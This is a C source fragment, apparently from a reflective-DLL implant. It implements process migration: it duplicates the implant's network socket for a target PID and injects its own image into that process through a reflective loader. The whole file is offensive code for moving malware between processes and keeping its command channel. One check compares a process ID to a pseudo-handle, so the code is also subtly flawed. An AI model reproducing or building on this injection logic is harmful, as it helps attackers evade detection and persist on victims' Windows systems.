#include "../internal.h"
#include "migration.h"
#include "../inject/inject.h"
#include "../../common/pe_structs.h"
#include "../reflect/reflect.h"

void Next(uint32_t pid)
{
    DllMeta.next.pid = pid;

    if(DllMeta.net.sock == INVALID_SOCKET)
        return;
    
    // set up *DllMeta.net.info
    WSADuplicateSocket(DllMeta.net.sock, pid, &DllMeta.net.info);
}

void Migrate()
{
    if(!DllMeta.next.pid || DllMeta.next.pid == (uint64_t)GetCurrentProcess())
        return;
    
    _InjectPid(DllMeta.curr.where, DllMeta.curr.size, offset_to_rva(DllMeta.curr.where, &_ReflectiveLoad), DllMeta.next.pid);
}
